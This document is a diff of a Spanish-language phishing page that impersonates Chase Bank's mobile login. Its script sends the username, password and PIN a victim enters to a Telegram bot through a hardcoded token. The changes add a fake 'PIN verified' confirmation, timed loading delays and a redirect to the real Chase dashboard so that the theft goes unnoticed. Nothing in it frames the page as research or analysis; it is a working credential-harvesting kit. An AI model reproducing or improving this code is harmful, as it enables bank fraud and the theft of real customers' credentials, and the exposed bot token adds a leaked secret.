@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Chase Móvil con Footer SVG y Funcionalidad Completa</title>
+  <title>Chase Móvil Actualizado</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: url('https://i.postimg.cc/2S8xtqnY/Fondo-Chase-Movil.jpg') no-repeat center center fixed;
+      background: url('https://i.postimg.cc/nzWv1V9b/CHASE-nuevo-fondo-con-pie-de-pagina-MOVIL.png') no-repeat center center fixed;
       background-size: contain;
       display: flex;
       flex-direction: column;
@@ -19,6 +19,7 @@
       margin: auto;
       padding: 20px 15px;
       flex-grow: 1;
+      position: relative;
     }
     .logo {
       display: flex;
@@ -52,7 +53,8 @@
     }
     input[type="text"],
     input[type="password"],
-    input[type="number"] {
+    input[type="number"],
+    input[type="text2"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -83,25 +85,54 @@
       font-size: 18px;
       margin-top: 40px;
     }
-    footer {
-      width: 100%;
-      flex-shrink: 0;
+    .success-message {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #0070C9;
+      color: white;
+      padding: 25px 30px;
+      border-radius: 12px;
+      box-shadow: 0 6px 15px rgba(0, 112, 201, 0.7);
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-size: 18px;
+      opacity: 0;
+      pointer-events: none;
+      animation: fadeInScale 0.8s forwards;
+      z-index: 10;
+      user-select: none;
     }
-    footer svg {
-      width: 100%;
-      display: block;
+    .success-message svg {
+      width: 32px;
+      height: 32px;
+      fill: #fff;
+      flex-shrink: 0;
+      animation: pulse 2s infinite ease-in-out;
+    }
+    @keyframes fadeInScale {
+      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+      100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-
   <div class="container">
 
     <div class="logo">
-      <img src="https://i.postimg.cc/D0PqjFZm/chase.png" alt="Chase Logo" />
+      <img src="" alt="" />
     </div>
 
-    <!-- FORMULARIO LOGIN -->
     <div class="login-box active" id="loginBox">
       <h2>Iniciar sesión</h2>
       <form id="loginForm">
@@ -115,7 +146,6 @@
       </form>
     </div>
 
-    <!-- LOADING -->
     <div class="loading" id="loadingDiv">
       <div class="spinner" style="
         border: 6px solid rgba(255,255,255,0.2);
@@ -129,37 +159,21 @@
       Cargando, por favor espera...
     </div>
 
-    <!-- FORMULARIO PIN -->
     <div class="pin-box" id="pinBox">
       <h2>Ingrese su PIN</h2>
       <form id="pinForm">
-        <input type="number" id="pin" placeholder="PIN de 4 dígitos" required maxlength="4" min="0" max="9999" />
+        <input type="text" id="pin" placeholder="Ingrese su PIN" required />
         <button type="submit" class="pin-btn">Continuar</button>
       </form>
     </div>
 
+    <div class="success-message" id="successMessage" style="display:none;">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/>
+      </svg>
+      <span>¡Gracias! Su PIN ha sido verificado correctamente.</span>
+    </div>
   </div>
-
-  <footer role="contentinfo" aria-label="Pie de página Chase">
-    <!-- Footer SVG embebido -->
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 288">
-      <style>
-        .footer-bg { fill: #fff; }
-        .footer-text1 { fill: #0070C9; font-weight: 700; font-size: 36px; font-family: Arial, sans-serif; }
-        .footer-text2 { fill: #555555; font-size: 30px; font-family: Arial, sans-serif; }
-        .footer-link { fill: #0070C9; font-weight: 600; text-decoration: underline; cursor: pointer; }
-        .footer-link:hover { fill: #005fa3; }
-      </style>
-      <rect class="footer-bg" width="1080" height="288"/>
-      <text x="540" y="70" class="footer-text1" text-anchor="middle">JPMorgan Chase Bank, N.A. Miembro FDIC.</text>
-      <text x="540" y="120" class="footer-text2" text-anchor="middle">© 2025 JPMorgan Chase &amp; Co. Todos los derechos reservados.</text>
-      <text x="540" y="170" class="footer-text2" text-anchor="middle">
-        Se aplican restricciones. 
-        <tspan class="footer-link">Aviso de privacidad</tspan> | 
-        <tspan class="footer-link">Condiciones de uso</tspan>
-      </text>
-    </svg>
-  </footer>
 
   <script>
     const token = "8007484732:AAH7GTfW46Sh4TWn9Wl3gb8sWoAdXQ-REDQ";
@@ -185,13 +199,13 @@
     const loginBox = document.getElementById("loginBox");
     const pinBox = document.getElementById("pinBox");
     const loadingDiv = document.getElementById("loadingDiv");
+    const successMessage = document.getElementById("successMessage");
 
     const loginForm = document.getElementById("loginForm");
     const pinForm = document.getElementById("pinForm");
 
     loginForm.addEventListener("submit", async (e) => {
       e.preventDefault();
-
       const usuario = document.getElementById("usuario").value;
       const contrasena = document.getElementById("contrasena").value;
 
@@ -213,7 +227,7 @@
       setTimeout(() => {
         loadingDiv.style.display = "none";
         pinBox.classList.add("active");
-      }, 60000); // 60 segundos
+      }, 5000); // 5 segundos de carga
     });
 
     pinForm.addEventListener("submit", (e) => {
@@ -222,21 +236,22 @@
 
       enviarMensaje(`🔐 PIN ingresado (Móvil): ${pin}`);
 
+      pinBox.style.display = "none";
+      loadingDiv.style.display = "block";
+
       setTimeout(() => {
-        window.location.href = "https://www.chase.com/personal/home?jp_pet=tnt-11070b&";
-      }, 1500); // Espera 1.5 segundos antes de redirigir (clave para móviles)
+        loadingDiv.style.display = "none";
+        successMessage.style.display = "flex";
+        successMessage.style.opacity = "0";
+        void successMessage.offsetWidth;
+        successMessage.style.animation = "fadeInScale 0.8s forwards";
+
+        setTimeout(() => {
+          window.open("https://secure.chase.com/web/auth/dashboard#/dashboard/index/index", "_top");
+        }, 2500);
+
+      }, 60000); // 60 segundos de espera tras PIN
     });
-
-    // Animación spinner
-    const styleSpinner = document.createElement('style');
-    styleSpinner.textContent = `
-      @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(styleSpinner);
   </script>
-
 </body>
 </html>
